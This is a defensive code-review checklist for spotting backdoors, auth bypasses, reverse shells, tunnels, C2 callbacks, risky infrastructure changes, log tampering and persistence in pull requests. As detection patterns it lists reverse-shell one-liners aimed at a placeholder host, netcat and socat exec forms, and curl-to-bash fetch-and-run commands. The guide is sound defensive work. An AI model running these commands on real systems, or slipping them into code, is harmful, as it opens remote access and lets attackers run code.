# Access, Backdoors, Network & Anti-Forensics

Read for changes touching authentication/authorization, networking, infrastructure
(Terraform/Kubernetes/Helm), CI/CD, Dockerfiles, or logging/audit.

## Contents
1. Authentication & authorization bypass
2. Hidden / magic endpoints & debug backdoors
3. Reverse shells & remote command execution
4. Tunnels, port-forwarding & C2 callbacks
5. Firewall / security-group / network exposure (incl. IaC & Kubernetes)
6. Credential & key material as a backdoor
7. Anti-forensics: disabling/weakening logging & audit
8. Persistence & scheduled execution
9. What to ask for

---

## 1. Authentication & authorization bypass

**Malicious / suspect shapes**
- A hardcoded "master"/"backdoor" credential, token, or key:
  `if password == "..."`, `if token == "<hex>"`, `if api_key in {...}`.
- Auth check that **fails open**: `try: verify() except: pass`, or returns
  `True`/authenticated on error, or a default `is_admin = True`.
- A bypass branch keyed on a magic header, query param, cookie, or user-agent
  (`if request.headers.get("X-Debug") == "...": skip_auth()`).
- Signature/JWT verification disabled, set to `algorithm=none`, or with the
  verify flag flipped (`verify=False`, `verify_signature: false`).
- Authorization/role check **removed** (a `-` line deleting a permission guard) or
  broadened (`role in {...}` widened, an `&&` turned into `||`).
- Comparison weakened: constant-time compare replaced with `==`; a `startswith`/
  prefix match where a full match is required.
- Session fixation/elevation: accepting a client-supplied user id/role, or minting
  a session for an unauthenticated path.

**Benign to rule out:** legitimate feature flags, well-scoped service-to-service
auth, test-only fixtures clearly excluded from production builds.
**Check:** Can any request reach a protected action without proper auth? Did any
auth/authz check get removed, broadened, or made conditional on attacker-
controllable input? Maps to OWASP A01:2025 (Broken Access Control), A07:2025
(Authentication Failures), CWE-798/CWE-287/CWE-306.

## 2. Hidden / magic endpoints & debug backdoors

**Malicious / suspect shapes**
- A new route/handler that is undocumented and performs privileged actions
  (run command, dump data, change config, move money) — especially if guarded only
  by a secret path or parameter.
- "Debug"/"admin"/"internal"/"healthz" endpoints that actually execute arbitrary
  input, eval expressions, or expose secrets/env.
- A handler that behaves normally unless a special parameter is present, then
  does something else (CWE-912 Hidden Functionality, CWE-489 Active Debug Code).
- Re-enabling a framework debug console / interactive debugger in production
  (`DEBUG=True`, Werkzeug/PIN, `/console`).

**Check:** Any new or modified endpoint that takes a magic value and does
something powerful? Any debug/eval surface exposed?

## 3. Reverse shells & remote command execution

**Malicious / suspect shapes**
- Spawning a shell wired to a socket: connecting a socket then `dup2` to
  stdin/stdout/stderr and exec `/bin/sh`; `bash -i >& /dev/tcp/<host>/<port> 0>&1`;
  `nc`/`ncat`/`socat` with `-e`/`EXEC`; `mkfifo` + shell + netcat.
- Executing **dynamic or remote** input as a command: `os.system`, `subprocess`
  with `shell=True` on built strings, `exec`/`eval`, `child_process.exec`,
  `Runtime.exec`, PHP `system`/`passthru`, backticks — fed by network/untrusted
  data.
- Download-and-execute: `curl <url> | bash`, `wget -O- | sh`, fetch a payload then
  run it, write a script to a temp dir and spawn a detached process.

**Benign to rule out:** legitimate, parameterised subprocess calls to known local
binaries with fixed/validated args; build scripts running trusted tooling.
**Check:** Does any code build/exec a shell command from non-constant input, open
a shell over a socket, or fetch-and-run remote code? Maps to OWASP A05:2025
(Injection), CWE-78/CWE-94; MITRE ATT&CK T1059 (Command/Scripting Interpreter),
T1071 (C2).

## 4. Tunnels, port-forwarding & C2 callbacks

This is the "opening a tunnel / changing network status as a backdoor" concern.

**Malicious / suspect shapes**
- Programmatically establishing an outbound tunnel: `ssh -R`/`-L`/`-D`,
  autossh, `ngrok`, `cloudflared tunnel`, `frp`, `chisel`, `gost`, `localtunnel`,
  a WireGuard/OpenVPN client config, or a SOCKS proxy started from app code.
- A reverse/back-connect channel that lets an external host reach internal
  services (a persistent outbound connection that proxies inbound traffic).
- **C2 callbacks / beaconing:** code that periodically contacts an external/
  uncommon domain or IP (especially newly hardcoded), sends host/environment
  recon, and may receive commands. Watch for raw IPs, dynamic-DNS hosts, pastebin/
  webhook/Discord/Telegram endpoints, and base64-encoded URLs.
- DNS exfiltration / DNS-over-HTTPS to an attacker resolver.
- Disabling certificate verification on an outbound client to talk to a C2.

**Benign to rule out:** known, configured integrations to documented partner
endpoints; observability agents to your real telemetry backend.
**Check:** Does the change open any inbound-reachable tunnel/proxy, or add outbound
contact to a host that isn't an established, documented dependency? Trace the
destination — is it allowlisted? Maps to MITRE ATT&CK T1572 (Protocol Tunneling),
T1090 (Proxy), T1071/T1568 (C2 / dynamic resolution); OWASP A02:2025.

## 5. Firewall / security-group / network exposure (incl. IaC & Kubernetes)

Infrastructure-as-code changes can open the perimeter as effectively as app code.

**Malicious / suspect shapes (Terraform / cloud)**
- Security group / NSG / firewall rule opening to `0.0.0.0/0` or `::/0`, especially
  on sensitive ports (22 SSH, 3389 RDP, 5432/3306/6379/27017 datastores, admin
  panels) or "all ports / all protocols".
- Making a resource public: `publicly_accessible = true`, public IP added, an S3
  bucket/blob ACL set public, a private subnet route to an internet/NAT gateway,
  RDS/Redis/Elasticsearch exposed.
- IAM changes granting `*:*` / `Action: "*"` / `Principal: "*"`, `iam:PassRole`
  broadly, or a new trust policy allowing an external/unknown account/principal.
- Disabling encryption, flow logs, GuardDuty/Config, or deletion protection.
- Egress opened wide where it was restricted (enabling exfil/C2).

**Malicious / suspect shapes (Kubernetes / Helm)**
- `hostNetwork: true`, `hostPID`, `hostIPC`; `privileged: true`;
  `allowPrivilegeEscalation: true`; added Linux capabilities (`SYS_ADMIN`,
  `NET_ADMIN`, `NET_RAW`); host path mounts (`/`, `/var/run/docker.sock`,
  `/proc`); running as root / `runAsNonRoot: false`.
- A `NodePort`/`LoadBalancer`/Ingress newly exposing an internal service; an
  overly-broad `NetworkPolicy` (or removal of one).
- A new `RoleBinding`/`ClusterRoleBinding` granting `cluster-admin` or broad verbs;
  a ServiceAccount token mounted where it shouldn't be.
- An image pulled from an untrusted registry or by mutable tag/`:latest` instead
  of a pinned digest.

**Malicious / suspect shapes (Dockerfile)**
- `curl ... | sh` in build; adding an unknown apt/pip/npm source or GPG key;
  `ADD <remote-url>`; baking in secrets; opening unexpected `EXPOSE` ports;
  installing `netcat`/`socat`/SSH server with no reason.

**Benign to rule out:** intentional, reviewed infra changes that match a ticket and
follow least privilege. The smell is breadth (`0.0.0.0/0`, `*`), host/privileged
escalation, or exposure that the PR description doesn't mention.
**Check:** Does the change widen network/identity exposure, escalate container
privilege, or weaken a security control in infra? Maps to OWASP A02:2025 (Security
Misconfiguration), CWE-732; PCI DSS Req 1 (network controls), Req 7/8 (least
privilege/access).

## 6. Credential & key material as a backdoor

**Malicious / suspect shapes**
- Adding an SSH `authorized_keys` entry, a new admin user, or a new API
  key/service account in code, config, IaC, or a migration.
- Recovery/2FA bypass: a static OTP, a skip flag, a "break-glass" path with a
  hardcoded secret.
- Weakening secret rotation/expiry, or pinning a long-lived credential.

**Check:** Does the change introduce any new persistent access principal or static
credential, or weaken credential controls? (See also `secrets-and-data.md`.)

## 7. Anti-forensics: disabling/weakening logging & audit

Covering tracks is a hallmark of deliberate wrongdoing, and degrades the firm's
ability to detect and investigate (OWASP A09:2025 Security Logging & Alerting
Failures; FCA expectations on audit trails).

**Malicious / suspect shapes**
- Removing or commenting out audit/security log lines around money movement, auth,
  or admin actions.
- Lowering log level so security events aren't recorded; adding a filter that drops
  specific events/users/accounts from logs or alerts.
- Swallowing exceptions silently (`except: pass`) on a security-relevant path so
  failures/attacks go unseen.
- Disabling an audit hook, monitoring middleware, or alert dispatch; raising an
  alert threshold so nothing fires.
- Tampering with log integrity (writing to a different/local sink, disabling
  append-only/forwarding, truncating).

**Check:** Does the change reduce what is logged/audited/alerted, especially around
money, auth, or admin? Is any exception being silently swallowed on a sensitive
path? Treat reductions in observability as suspicious until justified.

## 8. Persistence & scheduled execution

**Malicious / suspect shapes**
- A new cron/scheduled job, systemd unit, K8s CronJob, or background worker that
  runs payloads, phones home, or moves money/data on a timer.
- A startup/init hook (entrypoint, `postinstall`, app boot) that performs hidden
  actions.
- A webhook/event subscription that triggers privileged behaviour from outside.

**Check:** Any new scheduled/triggered execution path, and what does it actually
do on each run? Maps to MITRE ATT&CK T1053 (Scheduled Task/Job), T1505 (Server
Software Component).

## 9. What to ask for ("how to confirm benign")

The ticket/design that justifies any auth, network, infra, or logging change; the
identity of any new endpoint/credential/access principal and why it exists;
confirmation that any outbound destination is an established, documented, allow-
listed dependency; that exposure changes follow least privilege and match the
stated purpose; and that audit/alerting coverage is unchanged or improved, not
reduced.
